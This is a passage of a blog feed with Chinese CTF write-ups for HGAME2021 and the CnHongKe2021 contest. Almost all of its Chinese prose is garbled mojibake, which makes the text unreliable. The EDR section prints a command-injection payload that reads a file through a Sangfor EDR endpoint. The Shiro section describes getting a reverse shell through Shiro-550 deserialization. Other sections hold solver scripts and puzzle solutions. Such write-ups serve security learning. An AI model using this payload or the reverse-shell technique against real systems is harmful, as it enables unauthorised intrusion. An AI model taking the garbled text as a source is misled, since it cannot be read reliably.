number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        run<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">"/api/getFlag"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">#print(session.cookies)</span></code></pre><p>ä¸€ é”® è· å– flag</p><img src="/article/hgame2021/image-20210206163540205.png" class="" title="image-20210206163540205" loading="lazy"><hr><h3 id="èµ°ç§è€…çš„æ„¤æ€’"><a href="#èµ°ç§è€…çš„æ„¤æ€’" class="headerlink" title="èµ°ç§è€…çš„æ„¤æ€’"></a>èµ°ç§è€…çš„æ„¤æ€’</h3><p>é¢˜ç›®æè¿°ï¼š</p><p> <strong>æœ¬é¢˜ä¸ºå®è—èµ°ç§è€…çš„æ›´æ”¹ç‰ˆæœ¬ï¼Œè€ƒç‚¹ç›¸åŒï¼Œè¯·å…ˆåšå‡ºå®è—èµ°ç§è€…</strong><br>Liki æ—¥è®°ï¼š<br>2020å¹´2æœˆ2æ—¥ï¼š<br>ä»Šå¤©è­¦å±€å¯„æ¥ä¸€å°ä¿¡ï¼Œæ˜¯èµ°ç§è€… Switch å¯„æ¥çš„ï¼Œä¿¡é‡Œåªæœ‰ä¸€å¥è¯<br><strong>â€œæˆ‘æœ€è®¨åŒé¡ºé£è½¦ï¼Œæˆ‘å°†å¸¦æ¥æˆ‘çš„æ„¤æ€’â€</strong><br>çœŸæ˜¯è®©äººæ‘¸ä¸ç€å¤´è„‘â€¦â€¦<br>æˆ‘çœ‹ä¸æ‡‚ï¼Œä½†æˆ‘å¤§å—éœ‡æ’¼ã€‚ </p><p>é¢˜ç›®æè¿°ï¼š <a href="http://police.liki.link/">http://police.liki.link</a> </p><p>åŸå› æ˜¯web3èƒ½ä¸Šè½¦äº†2333</p><p>ç›¸åŒpayloadï¼Œæ”¹æ”¹hostå°±è¡Œ</p><img src="/article/hgame2021/QQ%E5%9B%BE%E7%89%8720210206163759.png" class="" title="QQå›¾ç‰‡20210206163759" loading="lazy"><hr><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><p>miscéšç¼˜åšåšäº†ï¼Œä¸€å‘¨ä¸‰åœºæ¯”èµ›æœ‰ç‚¹å¿™</p><hr><h3 id="Baseå…¨å®¶ç¦"><a href="#Baseå…¨å®¶ç¦" class="headerlink" title="Baseå…¨å®¶ç¦"></a>Baseå…¨å®¶ç¦</h3><p>é¢˜ç›®æè¿°ï¼š</p><p>æ–°å¹´å³å°†æ¥ä¸´ä¹‹é™…ï¼ŒBaseå®¶æ—ä¹Ÿå›¢èšäº†ï¼Œä»–ä»¬ç”¨ä»–ä»¬ç‰¹æœ‰çš„æ‰“æ‹›å‘¼æ–¹å¼å‘ä½ é—®äº†ä¸ªå¥½ï¼Œä½ çŸ¥é“ä»–ä»¬åœ¨è¯´ä»€ä¹ˆå—ï¼Ÿ R1k0RE1OWldHRTNFSU5SVkc1QkRLTlpXR1VaVENOUlRHTVlETVJCV0dVMlVNTlpVR01ZREtSUlVIQTJET01aVUdSQ0RHTVpWSVlaVEVNWlFHTVpER01KWElRPT09PT09<br><strong>æœ¬æ¬¡æ¯”èµ›ä¸ºæ‹›æ–°èµ›ï¼Œè¯·å„ä½é€‰æ‰‹ä¸è¦åœ¨å½“å‘¨æ¯”èµ›è¿›è¡ŒæœŸé—´è‡³ç»“æŸå24å°æ—¶å†…å‘å¸ƒå½“å‘¨æ¯”èµ›é¢˜ç›®çš„writeup</strong> </p><p>é¢˜ç›®åœ°å€ï¼š<a href="https://www.baidu.com/">https://www.baidu.com</a> å¾ˆå¼ºå•Š</p><p>base64+base32+base16 ä¸è§£é‡Š</p><hr><p>åæ§½ä¸‹MISC2</p><p>å‹ç¼©åŒ…å¯†ç çŸ¥é“æ˜¯å•¥å˜›ï¼Ÿ</p><img src="/article/hgame2021/1.jpg" class="" width="1" loading="lazy"><p>23333æ²¡é”™å°±æ˜¯çš„</p><p>misc3å¥½åƒæ˜¯æµé‡åŒ…ï¼Œèƒ½æå‡ºæ¥ä¸€å¼ å‡ Mçš„å›¾ç‰‡ï¼Œåˆ†æå›¾ç‰‡</p><hr><h3 id="Word-RE-MASTER"><a href="#Word-RE-MASTER" class="headerlink" title="Word RE:MASTER"></a>Word RE:MASTER</h3><p>é¢˜ç›®æè¿°ï¼š timmixä¸çŸ¥æ‰€è¸ªï¼Œåªç•™ä¸‹äº†ä¸¤ä¸ªwordæ–‡æ¡£ï¼Œä½œä¸ºwordä¸“å®¶çš„ä½ èƒ½å¸®å¿™æ‰¾å‡ºä»–çš„å»å‘å—ï¼Ÿ </p><p>é¢˜ç›®é“¾æ¥ï¼š<a href="https://1.oss.hgame2021.vidar.club/Word_REMASTER_e3c365a2c0edb60fbb7152279a31dafd.zip">https://1.oss.hgame2021.vidar.club/Word_REMASTER_e3c365a2c0edb60fbb7152279a31dafd.zip</a></p><p>å…¶å®æˆ‘ä»¥å‰å‡ºè¿‡ä¸€ä¸ªWordçš„Miscï¼Œæœ‰äººè®°å¾—å˜›2333</p><p>ä¸¤ä¸ªwordæ–‡æ¡£ï¼Œå…ˆçœ‹å±æ€§</p><img src="/article/hgame2021/image-20210206164905132.png" class="" title="image-20210206164905132" loading="lazy"><p>ä¼°è®¡å¦ä¸€ä¸ªæœ‰å¯†ç ï¼Œç›´æ¥ä»¥å‹ç¼©åŒ…å½¢å¼æ‰“å¼€</p><p>å¾ˆè½»æ˜“æœ‰ä¸ª<code>word/password.xml</code></p><img src="/article/hgame2021/image-20210206165015840.png" class="" title="image-20210206165015840" loading="lazy"><pre class="language-none"><code class="language-none">&lt;password&gt;+++++ +++[- &gt;++++ ++++&lt; ]&gt;+++ +.&lt;++ +[-&gt;+ ++&lt;]&gt; ++.&lt;+ ++[-&gt; +++&lt;] &gt;+.&lt;+ ++[-&gt; ---&lt;] &gt;-.++ ++++. &lt;+++[ -&gt;--- &lt;]&gt;-. +++.+ .++++ ++++. &lt;+++[ -&gt;--- &lt;]&gt;-- ----. +.--- --..+ .++++ +++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- ----- .&lt;&lt;&#x2F;password&gt;</code></pre><p>å¾ˆæ˜¾ç„¶brainfuck</p><p>è§£å¯†ç½‘ç«™<a href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a></p><p>è§£å¾—<code>DOYOUKNOWHIDDEN?</code></p><p>å¼€ç¬¬äºŒä¸ªæ–‡æ¡£ï¼Œåˆ†æäº†ä¸€ä¸‹ä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œæ–‡æ¡£åªæœ‰ä¸€å¼ å›¾ç‰‡</p><img src="/article/hgame2021/image-20210206165425076.png" class="" title="image-20210206165425076" loading="lazy"><p>é€‰ä¸­æ–‡æ¡£å‘ç°ä¸å¯¹åŠ²ï¼Œæ˜¾ç¤ºéšè—æ ‡è®°å‘ç°æœ‰éšè—å­—ç¬¦ï¼ŒæŠŠå­—ç¬¦å–æ¶ˆéšè—</p><img src="/article/hgame2021/image-20210206170404252.png" class="" title="image-20210206170404252" loading="lazy"><p>å‘ç°æ˜¯ç©ºç™½çš„ï¼Œå•ç‹¬ä¿å­˜ä¸‹æ¥</p><img src="/article/hgame2021/image-20210206170505833.png" class="" title="image-20210206170505833" loading="lazy"><p>ç»“åˆå›¾ç‰‡è·Ÿé›ªæœ‰å…³ï¼Œå¯èƒ½æ˜¯snowåŠ å¯†ï¼Œå»è·‘ä¸€ä¸‹è¯•è¯•</p><img src="/article/hgame2021/image-20210206170631851.png" class="" title="image-20210206170631851" loading="lazy"><p>ç¡®å®</p><hr><p>å…¶ä»–é¢˜ç›®å¯ä»¥ç­‰å®˜æ–¹æˆ–è€…PWNå¸ˆå‚…çš„WPå•¦ï¼Œæ¯æ¬¡åšé¢˜ä¸ç®¡ç®€å•è¿˜æ˜¯å›°éš¾éƒ½è¦æœ‰æ‰€æ”¶è·ï¼Œweek2å¸ˆå‚…ä»¬ä¹Ÿè¦åŠ æ²¹ï¼æå‰ç¥å¸ˆå‚…ä»¬æ–°å¹´å¿«ä¹ï¼</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;HAME2021-week ä¸ªäººWP&lt;/p&gt;
&lt;p&gt;æ˜µç§°ï¼šErr0r&lt;/p&gt;</summary>
    
    
    
    <category term="Write-Up" scheme="https://err0r.top/categories/Write-Up/"/>
    
    
    <category term="PHP" scheme="https://err0r.top/tags/PHP/"/>
    
    <category term="Python" scheme="https://err0r.top/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>CnHongKe2021å…¬æµ‹èµ›</title>
    <link href="https://err0r.top/article/2021gongcesai/"/>
    <id>https://err0r.top/article/2021gongcesai/</id>
    <published>2021-02-05T05:31:14.000Z</published>
    <updated>2021-03-30T11:47:47.552Z</updated>
    
    <content type="html"><![CDATA[<p>2æœˆ5æ—¥</p><p>æ¯”èµ›æƒ…å†µï¼š</p><img src="/article/2021gongcesai/image-20210205133228513.png" class="" title="rank" loading="lazy"><p>å°æ¯”èµ›</p><a id="more"></a><img src="/article/2021gongcesai/image-20210205133840182.png" class="" title="rank" loading="lazy"><p>ä¸»åŠæ–¹å¹³å°å…³å¤ªå¿«äº†2333ï¼Œç¡äº†ä¸€è§‰èµ·æ¥è¿å¹³å°éƒ½æ²¡äº†</p><h2 id="Sign"><a href="#Sign" class="headerlink" title="Sign"></a>Sign</h2><h3 id="Choice"><a href="#Choice" class="headerlink" title="Choice"></a>Choice</h3><p>PHP CGIè§£ææ¼æ´å‡ºç°çš„åŸå› æ˜¯ï¼ˆ ï¼‰</p><ul><li><p>A.cgi.fix_pathié…ç½®é”™è¯¯</p></li><li><p>B.cgi.fix_pathinfoé…ç½®é”™è¯¯</p></li><li><p>C.phpinfoé…ç½®é”™è¯¯</p></li><li><p>D.cgi.fix__status_ené…ç½®é”™è¯¯</p></li></ul><p>å¾ˆæ˜¾ç„¶æ˜¯<code>cgi.fix_pathinfo</code>é…ç½®é”™è¯¯ï¼Œå½“è®¾ç½®äº†cgi.fix_pathinfo = 1æ—¶ï¼ŒPHPå°±ä¼šä»¥â€™/â€˜ä¸ºåˆ†å‰²ç¬¦ä»æœ€åä¸€ä¸ªæ–‡ä»¶å¼€å§‹å‘å‰æ‰¾å­˜åœ¨çš„æ–‡ä»¶å»æ‰§è¡Œï¼Œä¾‹å¦‚<code>/upload/a.jpg/b.php</code>.</p><hr><h3 id="æ‰­è½¬ä¹¾å¤"><a href="#æ‰­è½¬ä¹¾å¤" class="headerlink" title="æ‰­è½¬ä¹¾å¤"></a>æ‰­è½¬ä¹¾å¤</h3><p>æ‰«ç å¾—flag</p><img src="/article/2021gongcesai/image-20210205172001695.png" class="" title="image-20210205172001695" loading="lazy"><hr><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="EDR"><a href="#EDR" class="headerlink" title="EDR"></a>EDR</h3><p>æ·±ä¿¡æœè½½å…¥å²å†Œ</p><p>ç›´æ¥payloadæ‰“</p><img src="/article/2021gongcesai/image-20210205134031474.png" class="" title="image-20210205134031474" loading="lazy"><p>Payload:</p><pre class="language-none"><code class="language-none">.&#x2F;?strip_slashes&#x3D;system&amp;host&#x3D;cat &#x2F;flag</code></pre><p>è¿™é¢˜å»å¹´æœ‰è¿‡ï¼Œæ˜¯ä½œä¸ºçº¿ä¸‹èµ›çš„é¢˜ç›®ï¼Œå½“æ—¶æ²¡å¤–ç½‘ï¼Œåªèƒ½ç¡¬å®¡ï¼Œæˆ–è€…â€¦<del>è®°å¾—payload</del>ï¼Œæ¯•ç«Ÿå¤ªæœ‰åäº†â€¦</p><hr><h3 id="shiro"><a href="#shiro" class="headerlink" title="shiro"></a>shiro</h3><p>Shiro remeberMeååºåˆ—åŒ–æ¼æ´ï¼ˆShiro-550ï¼‰</p><p>ç”¨æˆ·ç™»å½•æˆåŠŸåä¼šç”Ÿæˆç»è¿‡åŠ å¯†å¹¶ç¼–ç çš„cookieã€‚åœ¨æœåŠ¡ç«¯å¯¹rememberMeçš„cookieå€¼ï¼Œå…ˆbase64è§£ç ç„¶åAESè§£å¯†å†ååºåˆ—åŒ–ï¼Œå°±å¯¼è‡´äº†ååºåˆ—åŒ–RCEæ¼æ´</p><img src="/article/2021gongcesai/image-20210205135031033.png" class="" title="image-20210205135031033" loading="lazy"><p>å¯ä»¥å¦‚ <a href="https://www.cnblogs.com/sup3rman/archive/2020/07/16/13322898.html">å‚è€ƒæ–‡ç« </a> æ‰€ç¤ºï¼Œåˆ©ç”¨<code>shiro.py</code>ç”Ÿæˆpayload</p><img src="/article/2021gongcesai/image-20210205135241419.png" class="" title="image-20210205135241419" loading="lazy"><p>å½“ç„¶åæ¥æ‰å‘ç°æ›´ç®€å•çš„ï¼Œç›´æ¥ç”¨ <code>ShiroScan</code> å·¥å…·ï¼Œå¯ä»¥ç”¨DNSlogçš„æ–¹å¼ï¼Œä¹Ÿå¯ä»¥åå¼¹shellï¼Œè¿™é‡Œç›´æ¥åå¼¹shell</p><img src="/article/2021gongcesai/image-20210205135442119.png" class="" title="image-20210205135442119" loading="lazy"><p>æˆåŠŸå¼¹åˆ°shell</p><img src="/article/2021gongcesai/image-20210205135511988.png" class="" title="image-20210205135511988" loading="lazy"><hr><h3 id="fast-x-3"><a href="#fast-x-3" class="headerlink" title="fast x 3"></a>fast x 3</h3><p>è€è„šæœ¬å¤§å¸ˆäº†</p><img src="/article/2021gongcesai/image-20210205135615967.png" class="" title="image-20210205135615967" loading="lazy"><p>å†™ä¸ªpyè„šæœ¬å³å¯ï¼Œç›´æ¥ä¸Špayloadï¼Œè¹©è„šç¼–ç¨‹ï¼Œå¸ˆå‚…ä»¬è§è°…â€¦</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: UTF-8 -*-</span><span class="token triple-quoted-string string">"""@Time ï¼š 2021/2/5 9:22@Auth ï¼š gyy@Blog ï¼šhttp://err0r.top"""</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> collectionsurl <span class="token operator">=</span> <span class="token string">"http://180.109.90.207:23891/"</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"submit"</span><span class="token punctuation">:</span> <span class="token string">"æäº¤"</span><span class="token punctuation">&#125;</span>responses <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>responses<span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"1--------------------------------å–å­—ç¬¦ä¸²"</span><span class="token punctuation">)</span>cal <span class="token operator">=</span> responses<span class="token punctuation">.</span>text<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\r"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'&lt;b>'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'&lt;/b>'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;divid=\"math\">"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/div>"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span>cal<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"2--------------------------------è®¡æ•°"</span><span class="token punctuation">)</span><span class="token builtin">str</span> <span class="token operator">=</span> collections<span class="token punctuation">.</span>Counter<span class="token punctuation">(</span>cal<span class="token punctuation">)</span>str1 <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"3--------------------------------æ’åº"</span><span class="token punctuation">)</span><span class="token keyword">from</span> collections <span class="token keyword">import</span> OrderedDictstr2 <span class="token operator">=</span> OrderedDict<span class="token punctuation">(</span><span class="token builtin">sorted</span><span class="token punctuation">(</span>str1<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token operator">=</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span>x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"4--------------------------------å–key"</span><span class="token punctuation">)</span>val <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> str2<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    val <span class="token operator">+=</span> ival <span class="token operator">=</span> val<span class="token keyword">print</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"5--------------------------------èµ‹data"</span><span class="token punctuation">)</span>data<span class="token punctuation">[</span><span class="token string">'res'</span><span class="token punctuation">]</span> <span class="token operator">=</span> val<span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"6--------------------------------æäº¤"</span><span class="token punctuation">)</span>post_responses <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>post_responses<span class="token punctuation">)</span></code></pre><p>ç¼–ç¼–æ”¹æ”¹å‡‘åˆç”¨</p><img src="/article/2021gongcesai/image-20210205140020576.png" class="" title="image-20210205140020576" loading="lazy"><hr><h2 id="Apk"><a href="#Apk" class="headerlink" title="Apk"></a>Apk</h2><h3 id="Des"><a href="#Des" class="headerlink" title="Des"></a>Des</h3><p>2015ISCCçš„é¢˜ç›®æ”¹é¢˜<code>æ²¡æœ‰é¢˜ç›®çš„é¢˜ç›®</code></p><p>ä¸»è¦ä»£ç </p><pre class="language-none"><code class="language-none">public boolean check() &#123;     byte[] b2 &#x3D; &#123;103, 112, 111, 49, 61, 113, 117, 109, 76, 108, 77, 57, 59, 90, 64, 105, 33, 89, 74, 113, 92, 84, 87, 113, 105, 65, 35, 74, 93, 73, 43, 120&#125;;     byte[] b3 &#x3D; this.result1.getBytes();     for (int j &#x3D; 0; j &lt; b3.length; j++) &#123;         Log.d(&quot;test&quot;, ((byte) (b3[j] ^ j)));     &#125;     if (b3.length !&#x3D; b2.length) &#123;         return false;     &#125;     for (int j2 &#x3D; 0; j2 &lt; b2.length; j2++) &#123;         if ((b3[j2] ^ b2[j2]) !&#x3D; j2) &#123;             return false;         &#125;     &#125;     return true; &#125;</code></pre><p>exp:</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> pyDes <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> base64V0 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">112</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">113</span><span class="token punctuation">,</span> <span class="token number">117</span><span class="token punctuation">,</span> <span class="token number">109</span><span class="token punctuation">,</span> <span class="token number">76</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">77</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">89</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">113</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">84</span><span class="token punctuation">,</span> <span class="token number">87</span><span class="token punctuation">,</span> <span class="token number">113</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">65</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">93</span><span class="token punctuation">,</span> <span class="token number">73</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">DeCheck</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    v1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        v1<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span>    xx <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>v1<span class="token punctuation">)</span>    <span class="token comment">##print xx</span>    <span class="token keyword">return</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>xx<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    key <span class="token operator">=</span> <span class="token string">'ilovedes'</span>    iv <span class="token operator">=</span> <span class="token string">'\x01\x02\x03\x04\x05\x06\x07\x08'</span>    k <span class="token operator">=</span> des<span class="token punctuation">(</span>key<span class="token punctuation">,</span> CBC<span class="token punctuation">,</span> iv<span class="token punctuation">,</span> pad<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> padmode<span class="token operator">=</span>PAD_PKCS5<span class="token punctuation">)</span>    flag <span class="token operator">=</span> k<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>DeCheck<span class="token punctuation">(</span>V0<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"Your flag is: "</span> <span class="token operator">+</span> flag</code></pre><img src="/article/2021gongcesai/image-20210205140432528.png" class="" title="image-20210205140432528" loading="lazy"><img src="/article/2021gongcesai/QQ%E5%9B%BE%E7%89%8720210205171005.jpg" class="" title="QQå›¾ç‰‡20210205171005" loading="lazy"><p>å‚è€ƒé“¾æ¥ï¼š<a href="http://bobao.360.cn/ctf/learning/136.html">http://bobao.360.cn/ctf/learning/136.html</a></p><hr><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="DTMF"><a href="#DTMF" class="headerlink" title="DTMF"></a>DTMF</h3><p>ç”µè¯éŸ³ï¼Œç½‘ä¸Šæœ‰åœ¨çº¿è¯†åˆ«ç½‘ç«™</p><p><a href="http://dialabc.com/sound/detect/index.html">http://dialabc.com/sound/detect/index.html</a></p><p>æ ¼å¼è¦æ±‚<code>.wav</code>ï¼Œå…ˆç”¨ffmpegè½¬æ ¼å¼</p><img src="/article/2021gongcesai/image-20210205140704301.png" class="" title="image-20210205140704301" loading="lazy"><p>å†æ”¾ä¸Šå»è¯†åˆ«</p><img src="/article/2021gongcesai/image-20210205140736060.png" class="" title="image-20210205140736060" loading="lazy"><pre class="language-none"><code class="language-none">CnHongKe&#123;A18D3B18C*231#&#125;</code></pre><hr><h3 id="HalfQR"><a href="#HalfQR" class="headerlink" title="HalfQR"></a>HalfQR</h3><p>äºŒç»´ç ä¿®å¤ç½‘ç«™ <a href="https://merricx.github.io/qrazybox/">https://merricx.github.io/qrazybox/</a></p><img src="/article/2021gongcesai/qr1.jpg" class="" title="QR" loading="lazy"><p>æ‰‹ æ’¸</p><img src="/article/2021gongcesai/image-20210205165950957.png" class="" title="image-20210205165950957" loading="lazy"><img src="/article/2021gongcesai/image-20210205170018477.png" class="" title="image-20210205170018477" loading="lazy"><p>ç„¶å</p><img src="/article/2021gongcesai/image-20210205165843064.png" class="" title="image-20210205165843064" loading="lazy"><p>æœ€å</p><pre class="language-none"><code class="language-none">CnHongKe&#123;f88ae38f450e76d3c92410e3650df67&#125;</code></pre><p>ä¹Ÿå¯ä»¥æ‰‹ç®—â€¦æ¯•ç«Ÿæ•°æ®åŸŸçš„åŠè¾¹ä¸œè¥¿ç»™äº†</p><hr><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è¿™äº›é¢˜ç›®ä½œä¸ºçº¿ä¸‹èµ›é¢˜ç›®æ˜¯éš¾äº†ï¼Œæ¯•ç«Ÿå»å¹´æœ‰è¿‡ä¸€æ¬¡çº¿ä¸‹ï¼Œçº¿ä¸Šèµ›å°±ä¸è¯´äº†ï¼Œç¥ä»™ä¹±æ–—2333ï¼Œè¿˜ä¸ç”¨äº¤WPï¼Œå¸Œæœ›ä¸»åŠæ–¹èƒ½å®Œå–„èµ›åˆ¶ï¼Œé¦–å…ˆèµ›åéƒ½ä¸ç”¨äº¤WPæ˜¯æŒºç¦»è°±çš„ï¼Œå…¶æ¬¡é¢˜ç›®çš„è´¨é‡â€¦å…¶å®è¿˜è¡Œï¼Œä½†ä½œä¸ºçº¿ä¸Šè¿˜æ˜¯ç®€å•äº†ï¼Œä¸€ç¯‡wpå´å†™ä¸å‡ºå¤šå°‘ä¸œè¥¿ï¼Œé€šç¯‡å…«é¢˜ä»…ä»…ä¸€åƒå­—ï¼Œå¯èƒ½æ˜¯é¢˜ç›®é—®é¢˜ï¼Œä¹Ÿæœ‰ä¸€éƒ¨åˆ†æˆ‘çš„é—®é¢˜ï¼Œæ€»ä¹‹å¤šå¤šæ€»ç»“å§ã€‚</p><img src="/article/2021gongcesai/QQ%E5%9B%BE%E7%89%8720210205185049.jpg" class="" width="233" loading="lazy"><p>æ‡‚çš„éƒ½æ‡‚2333</p><p>è¿˜æ˜¯æœ‰äº›æ”¶è·çš„ï¼Œæå‰ç¥å¤§å®¶æ–°å¹´å¿«ä¹ï¼</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;2æœˆ5æ—¥&lt;/p&gt;
&lt;p&gt;æ¯”èµ›æƒ…å†µï¼š&lt;/p&gt;
&lt;img src=&quot;/article/2021gongcesai/image-20210205133228513.png&quot; class=&quot;&quot; title=&quot;rank&quot;&gt;

&lt;p&gt;å°æ¯”èµ›&lt;/p&gt;</summary>
    
    
    
    <category term="Write-Up" scheme="https://err0r.top/categories/Write-Up/"/>
    
    
    <category term="PHP" scheme="https://err0r.top/tags/PHP/"/>
    
    <category term="Python" scheme="https://err0r.top/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>æ˜¥ç§‹æ¯2021æ–°æ˜¥æ¬¢ä¹èµ›ä¸€é“é¢˜â€”â€”æŒ‰Fæ³¨å…¥ å¯¹pgsqlçš„ç ”ç©¶</title>
    <link href="https://err0r.top/article/cqb2021/"/>
    <id>https://err0r.top/article/cqb2021/</id>
    <published>2021-02-01T10:45:42.000Z</published>
    <updated>2021-03-30T11:49:26.770Z</updated>
    
